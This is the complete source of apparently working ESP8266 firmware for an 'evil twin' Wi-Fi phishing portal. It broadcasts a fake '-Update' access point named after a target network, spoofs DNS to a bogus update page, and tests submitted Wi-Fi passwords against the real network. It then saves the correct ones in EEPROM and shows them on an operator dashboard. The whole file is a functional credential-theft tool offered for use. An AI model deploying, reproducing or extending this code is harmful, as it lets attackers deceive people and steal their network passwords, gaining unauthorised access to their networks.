////////////////////////////////////////////////////
//              Made By HEINZGUENTER              //
// github.com/heinzguenter/ESP8266-Captive-Portal //
////////////////////////////////////////////////////

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

#include "portal_pages.h"
#include "dashboard.h"
#include "favicon.h"

#define DefaultSSID "Portal-Update" //Default SSID name

#define DNS_PORT 53 //Port for the DNS Server
const IPAddress APIP(192, 168, 1, 1); //The ip of the esp8266 itself where you can acces the dashboard and index page

#define passStart 34 //Starting location in EEPROM to save password.
int passEnd = passStart; //Ending location in EEPROM to save password.
String allPass; //Contains all Passwords 

String currentSSID; //Current SSID
String targetSSID; //ssid of the target network
String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)
bool validate = true; //contains if the password should be validated
String lastPass; //conatines the last checked password

DNSServer dnsServer; ESP8266WebServer webServer(80);

void redirect(String location){ webServer.sendHeader("Location", location, true); webServer.send(302); }

void handleDashboard() { //handles the dashboard page
  int networks = WiFi.scanNetworks(false); int scanstart = millis();
  while (networks <= 1 && millis() - scanstart < 5000){ delay(125); } //ensures that the website only loads if the scan is succesfull or it times out
  webServer.send(200, "text/html", dashboard(indexLang, favicon(), targetSSID, allPass, networks, validate));

  if (webServer.hasArg("led_off")){ digitalWrite(LED_BUILTIN, HIGH); redirect("/dashboard"); } //calls the led off function if the button on the dashboard is pressed
}

void handlePost(){
  Serial.printf("=====PasswordEntry=====\n");
  String pass = webServer.arg("wifiPassword"); //Getting the value of the Password field

  if(lastPass == pass){ //check if the entered password is the same as the last entered password
    if (WiFi.status() == 3 || validate == false){ redirect("/restarting"); Serial.printf("alredy checked: Correct Password\n"); } //if it was correct send to restarting page
    if (WiFi.status() == 6 && validate == true) { redirect("/incorrectPass"); Serial.printf("alredy checked: Wrong Password\n"); } //if it was incorrect send to wrong password page
    if (WiFi.status() != 6 && WiFi.status() != 3) { redirect("/incorrectPass"); }
  } else {

    if (validate == true){ //if validation is turned try to connect to the wifi that is beeing validated
      if (WiFi.status() == 3){ WiFi.disconnect();}
      WiFi.begin(targetSSID, pass);
      Serial.printf("Connnecting to: %s, %s\n", targetSSID.c_str(), pass.c_str());
    
      int time = millis(); int i = 0;
      while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
      Serial.printf("It Took: %i seconds\n", i/4); //print time it took to connect/get wrong password status
    }

    if (WiFi.status() == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
      Serial.printf("Password Correct\n");
      delay(5000);
      redirect("/restarting");
      
      lastPass = pass;

      pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; //Adding password and seconds after bootup in a ordered list.
      allPass += pass;                       //Updating the full passwords.

      for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM

      passEnd += pass.length(); //Updating end position of passwords in EEPROM.
      EEPROM.write(passEnd, '\0');
      EEPROM.commit();

      digitalWrite(LED_BUILTIN, LOW);
    } else { //if password was not correct redirect to the wrong password page
      Serial.printf("Password Incorrect\n");
      lastPass = pass;
    
      redirect("/incorrectPass");
    }
  }
  Serial.printf("WiFi Status : %i\n", WiFi.status());
  Serial.printf("=====PasswordEntry=====\n\n");
}

void handlePostSSID() {
  Serial.printf("=====NewSSID=====\n");

  String postedSSID = webServer.arg("ssid");

  targetSSID = postedSSID;
  postedSSID += "-Update"; //if you want to change this you have to edit the number of chars that are beeing subtracted in the setup where the target ssid is set
  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+1, postedSSID[i]); }
  EEPROM.write(postedSSID.length()+1, '\0');
  EEPROM.commit();

  redirect("/dashboard");

  WiFi.softAPdisconnect(true);
  delay(2000);
  WiFi.softAP(postedSSID);
  currentSSID = postedSSID;

  Serial.printf("SSID changed to: %s\n", currentSSID.c_str());

  Serial.printf("=====NewSSID=====\n\n");
}

void clearPass(){ //deletes all stored passwords
  Serial.printf("=====PasswordCleaner=====\n");

  allPass = "";
  passEnd = passStart; //Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  Serial.printf("All passwords deleted\n");
  redirect("/dashboard");

  Serial.printf("=====PasswordCleaner=====\n\n");
}

void handleLang(){ //change the language for the pages the user will see
  Serial.printf("=====Language=====\n");

  indexLang = webServer.arg("lang");
  Serial.printf("Language changed to: %s\n", indexLang.c_str());
  redirect("/dashboard");

  Serial.printf("=====Language=====\n\n");
}

void setValidate(){
  redirect("/dashboard");
  Serial.printf("=====SetValidation=====\n");

  if (webServer.arg("validate") == "on"){ validate = true; } else { validate = false; }

  Serial.printf("Validate set to %s\n", validate ? "true" : "false");
  Serial.printf("=====SetValidation=====\n\n");
}

void setup(){
  Serial.begin(115200);
  EEPROM.begin(512);

  Serial.printf("\n\n=====Setup=====\n");

  if (EEPROM.read(0) != '\0') {
    EEPROM.write(0, '\0');
    EEPROM.write(1, '\0');
    EEPROM.write(passStart, '\0');
    EEPROM.commit();
  }

  String ESSID;
  int i = 1;
  while (EEPROM.read(i) != '\0') { ESSID += char(EEPROM.read(i)); i++; } //Read EEPROM SSID

  //Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd)); //Reading the store password in EEPROM.
    passEnd++;                             //Updating the end location of password in EEPROM.
  }
  
  Serial.printf("WiFi mode setup: %s\n", WiFi.mode(WIFI_AP_STA) ? "Sucessfully!" : "Failed!");
  Serial.printf("Soft ap config: %s\n", WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0)) ? "Sucessfully!" : "Failed!");

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : DefaultSSID; //Setting currentSSID -> SSID in EEPROM or default one.
  targetSSID = currentSSID.substring(0, currentSSID.length() - 7);
  
  Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
  Serial.printf("AP SSID: %s\n", currentSSID.c_str());
  Serial.printf("Target SSID: %s\n", targetSSID.c_str());
  Serial.printf("DNS server setup: %s\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)

  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); });
  webServer.on("/post", handlePost);
  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, favicon(), targetSSID)); });
  webServer.on("/dashboard", handleDashboard);
  webServer.on("/clearPass", clearPass);
  webServer.on("/language", handleLang);
  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon(), targetSSID)); });
  webServer.on("/ssid", handlePostSSID);
  webServer.on("/validate", setValidate);
  
  webServer.onNotFound([](){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); });
  webServer.begin();

  //Enable the built-in LED
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.printf("=====Setup=====\n\n");
}

void loop(){
  dnsServer.processNextRequest();
  webServer.handleClient();
}
